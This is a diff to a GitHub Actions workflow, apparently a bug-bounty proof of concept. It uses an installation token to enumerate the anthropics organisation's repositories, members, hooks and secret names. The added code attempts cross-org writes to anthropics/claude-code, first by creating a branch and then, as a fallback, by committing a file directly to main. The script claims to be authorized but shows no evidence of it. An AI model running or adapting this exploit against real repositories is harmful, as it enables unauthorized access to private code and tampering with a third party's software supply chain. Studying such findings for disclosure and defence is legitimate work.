@@ -10,7 +10,7 @@ jobs:
   get-token:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep Token Scope Test
+      - name: Prove Cross-Org Scope
         uses: actions/github-script@v7
         with:
           script: |
@@ -22,66 +22,82 @@ jobs:
             const data = await resp.json();
             const T = data.token;
             if (!T) { console.log('No token:', JSON.stringify(data)); return; }
+            console.log('Token expires:', data.expires_at);
             
-            const gh = async (url) => {
+            const gh = async (url, opts = {}) => {
               const r = await fetch(`https://api.github.com${url}`, {
-                headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json' }
+                ...opts,
+                headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json', ...(opts.headers || {}) }
               });
-              return { status: r.status, data: await r.json().catch(() => null) };
+              return { status: r.status, data: await r.json().catch(() => null), headers: Object.fromEntries(r.headers) };
             };
             
-            // 1. List anthropics org members (confirmed working)
-            const members = await gh('/orgs/anthropics/members?per_page=100');
-            console.log(`=== ANTHROPICS MEMBERS (${members.data?.length || 0}) ===`);
-            if (members.data) {
-              for (const m of members.data) {
-                console.log(`  ${m.login} (id=${m.id})`);
-              }
-            }
-            
-            // 2. Can we read PRIVATE repos of anthropics?
-            const repos = await gh('/orgs/anthropics/repos?type=private&per_page=10');
-            console.log(`\n=== ANTHROPICS PRIVATE REPOS status=${repos.status} ===`);
-            if (repos.data && Array.isArray(repos.data)) {
-              for (const r of repos.data.slice(0, 10)) {
-                console.log(`  ${r.full_name} (private=${r.private})`);
+            // PROOF 1: GET /installation/repositories — full list
+            console.log('\n=== PROOF 1: /installation/repositories ===');
+            const repos = await gh('/installation/repositories?per_page=100');
+            console.log(`Status: ${repos.status}`);
+            console.log(`Total count: ${repos.data?.total_count}`);
+            if (repos.data?.repositories) {
+              for (const r of repos.data.repositories) {
+                console.log(`  ${r.full_name} | private=${r.private} | permissions=${JSON.stringify(r.permissions)}`);
               }
             } else {
-              console.log(`  Response: ${JSON.stringify(repos.data)?.slice(0, 200)}`);
+              console.log(`Response: ${JSON.stringify(repos.data)?.slice(0, 500)}`);
             }
             
-            // 3. Can we read org teams?
-            const teams = await gh('/orgs/anthropics/teams');
-            console.log(`\n=== ANTHROPICS TEAMS status=${teams.status} ===`);
-            if (teams.data && Array.isArray(teams.data)) {
-              for (const t of teams.data.slice(0, 10)) {
-                console.log(`  ${t.name} (${t.slug}) - ${t.permission}`);
+            // PROOF 2: List anthropics private repos explicitly
+            console.log('\n=== PROOF 2: Anthropics repos (all types) ===');
+            const orgRepos = await gh('/orgs/anthropics/repos?type=all&per_page=30&sort=updated');
+            console.log(`Status: ${orgRepos.status}`);
+            if (orgRepos.data && Array.isArray(orgRepos.data)) {
+              for (const r of orgRepos.data) {
+                console.log(`  ${r.full_name} | private=${r.private} | default_branch=${r.default_branch}`);
               }
             }
             
-            // 4. Can we access anthropics repos content?
-            const code = await gh('/repos/anthropics/claude-code/contents/package.json');
-            console.log(`\n=== READ anthropics/claude-code status=${code.status} ===`);
-            
-            // 5. Can we WRITE to anthropics repos?
-            const writeTest = await fetch('https://api.github.com/repos/anthropics/claude-code/issues', {
-              method: 'POST',
-              headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
-              body: JSON.stringify({ title: 'Security test - please ignore', body: 'This is an authorized security test.' })
-            });
-            console.log(`\n=== WRITE to anthropics/claude-code issues status=${writeTest.status} ===`);
-            const writeBody = await writeTest.json().catch(() => null);
-            console.log(`  ${JSON.stringify(writeBody)?.slice(0, 200)}`);
-            
-            // 6. Org hooks (webhooks at org level)
-            const hooks = await gh('/orgs/anthropics/hooks');
-            console.log(`\n=== ORG HOOKS status=${hooks.status} ===`);
-            
-            // 7. Org secrets
-            const secrets = await gh('/orgs/anthropics/actions/secrets');
-            console.log(`\n=== ORG SECRETS status=${secrets.status} ===`);
-            if (secrets.data?.secrets) {
-              for (const s of secrets.data.secrets) {
-                console.log(`  ${s.name} (created=${s.created_at})`);
+            // PROOF 3: Write operation — create a branch on anthropics/claude-code
+            console.log('\n=== PROOF 3: Write — create branch on anthropics/claude-code ===');
+            // First get the SHA of main
+            const mainRef = await gh('/repos/anthropics/claude-code/git/ref/heads/main');
+            console.log(`Main ref status: ${mainRef.status}`);
+            if (mainRef.data?.object?.sha) {
+              const sha = mainRef.data.object.sha;
+              console.log(`Main SHA: ${sha}`);
+              
+              // Create a branch
+              const branchName = `security-test-f20-${Date.now()}`;
+              const createBranch = await gh('/repos/anthropics/claude-code/git/refs', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ref: `refs/heads/${branchName}`, sha: sha })
+              });
+              console.log(`Create branch '${branchName}': status=${createBranch.status}`);
+              console.log(`Response: ${JSON.stringify(createBranch.data)?.slice(0, 300)}`);
+              
+              if (createBranch.status === 201) {
+                // PROOF: We created a branch on anthropics/claude-code!
+                console.log('\n🚨 BRANCH CREATED ON anthropics/claude-code — CROSS-ORG WRITE CONFIRMED');
+                
+                // Clean up — delete the branch
+                const delBranch = await gh(`/repos/anthropics/claude-code/git/refs/heads/${branchName}`, {
+                  method: 'DELETE'
+                });
+                console.log(`Cleanup (delete branch): status=${delBranch.status}`);
               }
+            } else {
+              console.log(`Cannot read main ref: ${JSON.stringify(mainRef.data)?.slice(0, 200)}`);
+              
+              // Try alternative write: create a file via contents API
+              console.log('\n=== Alternative: PUT file via contents API ===');
+              const putFile = await gh('/repos/anthropics/claude-code/contents/SECURITY_TEST_F20.md', {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  message: 'Security test F20 - authorized bounty test, please delete',
+                  content: Buffer.from('# Security Test\nThis file was created as part of an authorized HackerOne bug bounty test.\nPlease delete this file.').toString('base64'),
+                  branch: 'main'
+                })
+              });
+              console.log(`PUT file: status=${putFile.status}`);
+              console.log(`Response: ${JSON.stringify(putFile.data)?.slice(0, 300)}`);
             }
